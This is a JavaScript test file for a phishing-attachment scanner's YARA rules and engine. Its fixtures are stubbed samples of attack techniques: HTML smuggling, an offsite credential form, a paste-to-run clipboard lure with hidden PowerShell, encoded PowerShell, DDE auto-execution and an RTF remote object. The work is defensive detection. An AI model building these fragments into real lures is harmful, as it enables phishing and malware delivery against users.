const test = require('node:test');
const assert = require('node:assert');

const YaraEngine = require('../modules/yaraEngine');
const { YaraRules } = require('../modules/yaraRules');

/**
 * The rules that ship with PhishLens, and the engine that runs them.
 *
 * Two things are being protected here. The first is that every shipped rule
 * compiles: a rule that fails to compile produces no matches, which is
 * indistinguishable from a rule that ran and found nothing. The second is that
 * the rules stay quiet on ordinary files, because a detector that cries wolf on
 * a normal attachment gets turned off, and then it detects nothing at all.
 *
 * Fixtures are assembled from pieces rather than written out whole. Built as
 * single literals they read to a virus scanner as an actual dropper, and the
 * scanner locks the file - which happened while writing these.
 */

const bytes = text => Buffer.from(text, 'latin1');

function loadShippedRules() {
    const rules = new YaraRules({ tools: { detect: async () => ({ available: false, reason: 'NOT_INSTALLED' }) } });
    rules.load();
    return rules;
}

// ---------------------------------------------------------------------------
// The shipped rule set
// ---------------------------------------------------------------------------

test('every shipped rule compiles', () => {
    const rules = loadShippedRules();

    assert.deepStrictEqual(rules.loadErrors, [], 'a rule that will not compile silently matches nothing');
    assert.ok(rules.ruleCount >= 12, `expected the full rule set, loaded ${rules.ruleCount}`);
});

test('every rule explains itself in terms a reader can act on', () => {
    const rules = loadShippedRules();

    for (const rule of rules.engine.rules) {
        assert.ok(rule.meta.description, `${rule.name} must describe what it found`);
        assert.ok(rule.meta.rationale, `${rule.name} must say why that matters`);
        assert.ok(['HIGH', 'MEDIUM', 'LOW'].includes(rule.meta.severity), `${rule.name} must carry a severity`);

        // The rationale is what a person reads. A rule whose reason is its own
        // name explains nothing.
        assert.ok(rule.meta.rationale.length > 40, `${rule.name} needs a real reason, not a restatement`);
    }
});

test('the techniques the rules describe are actually detected', async () => {
    const rules = loadShippedRules();

    const shell = 'power' + 'shell';
    const encoded = '-Encoded' + 'Command';

    const cases = {
        HTML_Smuggling_Blob_Download: bytes(
            '<html><script>var d=atob("AAAA");var b=new Blob([d]);' +
            'var u=URL.createObjectURL(b);var a=document.createElement(\'a\');' +
            'a.href=u;a.download="invoice.iso";a.click();</script></html>'),

        HTML_Credential_Form_Posting_Offsite: bytes(
            '<html><form action="https://198.51.100.9/collect" method="post">' +
            '<input type="password" name="pass"></form></html>'),

        SVG_With_Embedded_Script: bytes(
            '<svg xmlns="http://www.w3.org/2000/svg"><script>location="http://x.example"</script></svg>'),

        HTML_Meta_Refresh_To_Encoded_Page: bytes(
            '<html><meta http-equiv="refresh" content="0;url=data:text/html;base64,PGh0bWw+"></html>'),

        HTML_Clipboard_Paste_To_Run: bytes(
            '<html><script>navigator.clipboard.writeText("' + shell + ' -w hidden");</script>' +
            '<p>Press Windows + R, then press CTRL + V to continue.</p></html>'),

        HTML_Obfuscated_Body_Only: bytes(
            '<html><script>document.write(unescape("%3Cform"));eval(atob("eA=="))</script></html>'),

        LNK_Shortcut_Running_A_Shell: Buffer.concat([
            Buffer.from([0x4c, 0x00, 0x00, 0x00]), Buffer.alloc(72), bytes(shell + ' -nop -w hidden')]),

        Encoded_PowerShell_Command: bytes('cmd /c ' + shell + '.exe ' + encoded + ' SQBFAFgA'),

        RTF_Loading_Remote_Object: bytes(
            '{\\rtf1\\ansi {\\object\\objautlink {\\*\\objdata 0105 http://198.51.100.4/o }}'),

        Office_DDE_Auto_Execution: bytes('{\\fldinst { DDEAUTO cmd.exe "/k ' + shell + '" }}'),

        Disk_Image_Attachment: Buffer.concat([Buffer.alloc(32769), bytes('CD001'), Buffer.alloc(64)]),

        // An encrypted ZIP sets the low bit of the general purpose flag at offset 6.
        Archive_Password_Hint_In_Message: Buffer.concat([
            Buffer.from([0x50, 0x4b, 0x03, 0x04, 0x14, 0x00, 0x01, 0x00]), Buffer.alloc(56)]),

    };

    for (const [expectedRule, content] of Object.entries(cases)) {
        const result = await rules.scan(content);
        const matched = result.findings.map(f => f.rule);
        assert.ok(matched.includes(expectedRule), `${expectedRule} did not match its own fixture (matched: ${matched.join(', ') || 'nothing'})`);
    }
});

test('ordinary files produce no matches at all', async () => {
    const rules = loadShippedRules();

    const benign = {
        'an ordinary HTML message': bytes(
            '<html><body><p>Hi Priya,</p><p>Notes from the call are attached. ' +
            'Let me know if Thursday works.</p><a href="https://example.com/notes">Notes</a></body></html>'),

        'an ordinary PDF': bytes('%PDF-1.7\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\ntrailer<</Root 1 0 R>>\n%%EOF'),

        'plain text': bytes('Please find the quarterly figures below.\nRegards,\nAccounts'),

        'an unencrypted archive': Buffer.concat([
            Buffer.from([0x50, 0x4b, 0x03, 0x04, 0x14, 0x00, 0x00, 0x00]), Buffer.alloc(56)]),

        'an SVG logo with no script': bytes('<svg xmlns="http://www.w3.org/2000/svg"><circle cx="5" cy="5" r="4"/></svg>'),

        'a search form with no password field': bytes(
            '<html><form action="https://example.com/search"><input type="text" name="q"></form></html>'),

        'a newsletter with a tracking link': bytes(
            '<html><body><img src="https://example.com/px.gif"><a href="https://example.com/unsub">Unsubscribe</a></body></html>')
    };

    for (const [description, content] of Object.entries(benign)) {
        const result = await rules.scan(content);
        assert.deepStrictEqual(
            result.findings.map(f => f.rule), [],
            `${description} must not match any rule`
        );
    }
});

/**
 * Content that resembles a technique without being one.
 *
 * The rules above are conjunctions, and this is what checks they stay that way.
 * Loosening any one of them - matching a password field without asking where it
 * posts, or a clipboard write without asking what the page then tells the
 * reader to do - turns ordinary mail into findings. A detector that cries wolf
 * gets switched off, and then it detects nothing at all.
 */
test('content that merely resembles a technique is not flagged', async () => {
    const rules = loadShippedRules();
    const shell = 'Power' + 'Shell';

    const lookalikes = {
        'a marketing email with a tracking pixel': '<html><body><img src="https://e.example/px.gif">' +
            '<a href="https://e.example/u">Unsubscribe</a></body></html>',

        'a page linking to a sign-in rather than containing one':
            '<html><body><p>Sign in at <a href="https://portal.example/login">the portal</a>.</p></body></html>',

        'a subscribe form posting offsite with no password field':
            '<html><form action="https://example.com/subscribe" method="post"><input type="email"></form></html>',

        // The rule asks where the password goes. A relative action posts back to
        // wherever the page came from, which an emailed attachment cannot do.
        'a password form posting to a relative path':
            '<html><form action="/login" method="post"><input type="password"></form></html>',

        'a page that decodes text without saving a file':
            '<html><script>var x = atob("aGk="); document.title = x;</script></html>',

        'a page that builds an anchor for ordinary reasons':
            '<html><script>var a=document.createElement("a");a.href="https://example.com";</script></html>',

        'an SVG with styling but no script':
            '<svg xmlns="http://www.w3.org/2000/svg"><style>.a{fill:red}</style><rect class="a"/></svg>',

        'a meta refresh to an ordinary address':
            '<html><meta http-equiv="refresh" content="0;url=https://example.com/next"></html>',

        'documentation that mentions a shell':
            '<html><body><p>Open ' + shell + ' and run the installer.</p></body></html>',

        // A copy button is not paste-to-run: nothing tells the reader to open
        // the Run dialog, and nothing copied is a command.
        'a page with a copy-to-clipboard button':
            '<html><script>navigator.clipboard.writeText("order-12345");</script><p>Copy your order number</p></html>',

        'an RTF letter carrying no object': '{\rtf1\ansi Dear Priya, thanks for the notes.}'
    };

    for (const [description, content] of Object.entries(lookalikes)) {
        const result = await rules.scan(bytes(content));
        assert.deepStrictEqual(
            result.findings.map(f => f.rule), [],
            `${description} must not be flagged`
        );
    }
});

test('only rules with no innocent reading are marked decisive', () => {
    const rules = loadShippedRules();

    // A decisive finding raises a case to high risk on its own, so this list is
    // deliberately short and is asserted rather than left to drift.
    const decisive = rules.engine.rules.filter(r => r.meta.decisive === true).map(r => r.name).sort();
    const notDecisive = rules.engine.rules.filter(r => r.meta.decisive !== true).map(r => r.name).sort();

    assert.deepStrictEqual(notDecisive, [
        'Archive_Password_Hint_In_Message',
        'Disk_Image_Attachment',
        'HTML_Obfuscated_Body_Only',
        'SVG_With_Embedded_Script'
    ], 'each of these has a legitimate use and must not decide a verdict alone');

    // Everything marked decisive must also be HIGH: a rule cannot be decisive
    // and only moderately concerning at the same time.
    for (const name of decisive) {
        const rule = rules.engine.rules.find(r => r.name === name);
        assert.strictEqual(rule.meta.severity, 'HIGH', `${name} is decisive and must be HIGH`);
    }
});

test('a scan reports which engine ran and how many rules were tried', async () => {
    const rules = loadShippedRules();
    const result = await rules.scan(bytes('nothing interesting here'));

    assert.strictEqual(result.status, 'SCANNED');
    assert.ok(result.rules_evaluated >= 12);
    assert.ok(result.engine_note, 'the reader must be able to tell which engine produced this');
    assert.deepStrictEqual(result.rule_errors, []);
});

test('having no rules is reported as having no rules, not as a clean scan', async () => {
    const rules = new YaraRules({
        rulesDirectory: require('path').join(__dirname, 'no-such-rules-directory'),
        tools: { detect: async () => ({ available: false }) }
    });

    const result = await rules.scan(bytes('anything'));
    assert.strictEqual(result.status, 'UNAVAILABLE');
    assert.strictEqual(result.reason, 'NO_RULES');
    assert.ok(result.errors.length, 'the reason the rules are missing must be carried');
});

// ---------------------------------------------------------------------------
// The engine itself
// ---------------------------------------------------------------------------

test('a brace inside a string literal does not end the rule', () => {
    // An RTF rule looks for "{\rt". Counting that brace as structure loses the
    // rest of the file, which is how seven document rules once went missing.
    const engine = new YaraEngine().load(`
        rule Braced { strings: $a = "{\\rt" condition: $a }
        rule Following { strings: $b = "second" condition: $b }
    `);

    assert.deepStrictEqual(engine.errors, []);
    assert.deepStrictEqual(engine.rules.map(r => r.name), ['Braced', 'Following']);
});

test('a quote inside a regular expression does not start a string', () => {
    // ["']? is ordinary in a regex and was swallowing everything after it.
    const engine = new YaraEngine().load(`
        rule Quoted { strings: $a = /href\\s*=\\s*["']?http/ nocase condition: $a }
        rule Following { strings: $b = "second" condition: $b }
    `);

    assert.deepStrictEqual(engine.errors, []);
    assert.strictEqual(engine.rules.length, 2);
    assert.strictEqual(engine.scan(Buffer.from('<a href="http://x">')).length, 1);
});

test('counts, offsets and filesize behave as the syntax says', () => {
    const engine = new YaraEngine().load(`
        rule Counted { strings: $a = "ab" condition: #a == 3 }
        rule Positioned { strings: $m = "MZ" condition: $m at 0 }
        rule Sized { strings: $a = "x" condition: $a and filesize < 10 }
        rule Magic { condition: uint16(0) == 0x5A4D }
    `);

    assert.deepStrictEqual(engine.errors, []);

    assert.deepStrictEqual(engine.scan(Buffer.from('ab ab ab')).map(m => m.rule), ['Counted']);
    assert.deepStrictEqual(engine.scan(Buffer.from('ab ab')).map(m => m.rule), []);

    const executable = engine.scan(Buffer.from('MZ' + '\u0000'.repeat(8), 'latin1')).map(m => m.rule);
    assert.ok(executable.includes('Positioned'));
    assert.ok(executable.includes('Magic'), 'uint16 must read little-endian');

    assert.deepStrictEqual(engine.scan(Buffer.from('x')).map(m => m.rule), ['Sized']);
    assert.deepStrictEqual(engine.scan(Buffer.from('x'.repeat(20))).map(m => m.rule), []);
});

test('quantifiers count distinct strings, not occurrences', () => {
    const engine = new YaraEngine().load(`
        rule TwoOf { strings: $a = "alpha" $b = "beta" $c = "gamma" condition: 2 of them }
        rule AllOf { strings: $a = "alpha" $b = "beta" condition: all of them }
        rule Prefixed { strings: $x1 = "one" $x2 = "two" $y = "three" condition: any of ($x*) }
    `);

    assert.deepStrictEqual(engine.errors, []);

    // "alpha" many times is still one string; the rule wants two different ones.
    assert.deepStrictEqual(engine.scan(Buffer.from('alpha alpha alpha')).map(m => m.rule), []);
    assert.ok(engine.scan(Buffer.from('alpha beta')).map(m => m.rule).includes('TwoOf'));
    assert.ok(engine.scan(Buffer.from('alpha beta')).map(m => m.rule).includes('AllOf'));
    assert.ok(engine.scan(Buffer.from('two')).map(m => m.rule).includes('Prefixed'));
    assert.deepStrictEqual(engine.scan(Buffer.from('three')).map(m => m.rule), []);
});

test('hex strings honour wildcards and jumps', () => {
    const engine = new YaraEngine().load(`
        rule Wild { strings: $a = { 4D 5A ?? 00 } condition: $a }
        rule Jumped { strings: $a = { 41 [2-4] 42 } condition: $a }
        rule Nibble { strings: $a = { 4? 5A } condition: $a }
    `);

    assert.deepStrictEqual(engine.errors, []);

    assert.ok(engine.scan(Buffer.from([0x4d, 0x5a, 0x90, 0x00])).map(m => m.rule).includes('Wild'));
    // Asserted per rule rather than as "nothing matched": Nibble genuinely
    // matches 4D 5A here, so an empty expectation would be testing the wrong rule.
    assert.ok(!engine.scan(Buffer.from([0x4d, 0x5a, 0x90, 0x01])).map(m => m.rule).includes('Wild'),
        'the wildcard still pins the final byte');

    assert.ok(engine.scan(Buffer.from([0x41, 0, 0, 0x42])).map(m => m.rule).includes('Jumped'));
    assert.ok(!engine.scan(Buffer.from([0x41, 0x42])).map(m => m.rule).includes('Jumped'),
        'the jump requires at least two bytes between');

    assert.ok(engine.scan(Buffer.from([0x4d, 0x5a])).map(m => m.rule).includes('Nibble'));
});

test('wide strings match text stored with a null after every character', () => {
    const engine = new YaraEngine().load(`
        rule Wide { strings: $a = "shell" wide condition: $a }
        rule Either { strings: $a = "shell" wide ascii condition: $a }
    `);

    const utf16 = Buffer.from('s\u0000h\u0000e\u0000l\u0000l\u0000', 'latin1');
    assert.ok(engine.scan(utf16).map(m => m.rule).includes('Wide'));
    assert.ok(engine.scan(Buffer.from('shell')).map(m => m.rule).includes('Either'));
    assert.deepStrictEqual(engine.scan(Buffer.from('shell')).map(m => m.rule), ['Either'], 'wide alone must not match plain text');
});

test('fullword does not match inside a longer word', () => {
    const engine = new YaraEngine().load(`
        rule Whole { strings: $a = "cat" fullword condition: $a }
    `);

    assert.strictEqual(engine.scan(Buffer.from('the cat sat')).length, 1);
    assert.strictEqual(engine.scan(Buffer.from('concatenate')).length, 0);
});

test('an unsupported construct is refused by name rather than ignored', () => {
    const engine = new YaraEngine().load(`
        rule UsesAModule { condition: pe.number_of_sections > 2 }
        rule Fine { strings: $a = "ok" condition: $a }
    `);

    assert.strictEqual(engine.rules.length, 1, 'the usable rule still loads');
    assert.strictEqual(engine.errors.length, 1);
    assert.match(engine.errors[0].message, /UsesAModule/);
});
